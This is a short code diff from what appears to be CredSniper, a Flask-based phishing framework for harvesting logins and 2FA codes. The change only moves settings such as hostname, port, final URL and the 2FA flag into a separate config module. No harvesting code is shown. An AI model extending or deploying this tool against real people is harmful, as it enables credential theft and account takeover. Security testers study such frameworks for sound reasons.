@@ -1,19 +1,22 @@
 from flask import Flask, jsonify, request, abort, Response
 from jinja2 import Environment, PackageLoader, select_autoescape
-from core import config, functions
+from core import functions
+import config
 import os, importlib, argparse, time
 
 class CredSniper():
     def __init__(self):
         self.api = None
         self.module = None
-        self.module_name = None
-        self.final_url = None
-        self.port = None
-        self.enable_2fa = None
-        self.seen = set()
-        self.verbose = False
-        self.hostname = None
+
+        # config
+        self.module_name = config.MODULE_NAME
+        self.final_url = config.FINAL_URL
+        self.port = config.PORT
+        self.enable_2fa = config.ENABLE_2FA
+        self.seen = config.SEEN
+        self.verbose = config.VERBOSE
+        self.hostname = config.HOSTNAME
 
         #app = Flask(
             #__name__,
@@ -24,9 +27,6 @@ class CredSniper():
         self.prepare_storage()
         self.prepare_module()
         self.prepare_api()
-
-        # TODO: Move parameters to a config for sharing
-        self.config = config.Config()
 
 
     def prepare_module(self):
@@ -107,7 +107,7 @@ class CredSniper():
         if not os.path.exists('.sniped'):
             os.mknod('.sniped')
 
-        
+
     def verbose_print(self, message):
         if self.verbose:
             dt = time.strftime('%Y-%m-%d %H:%M')
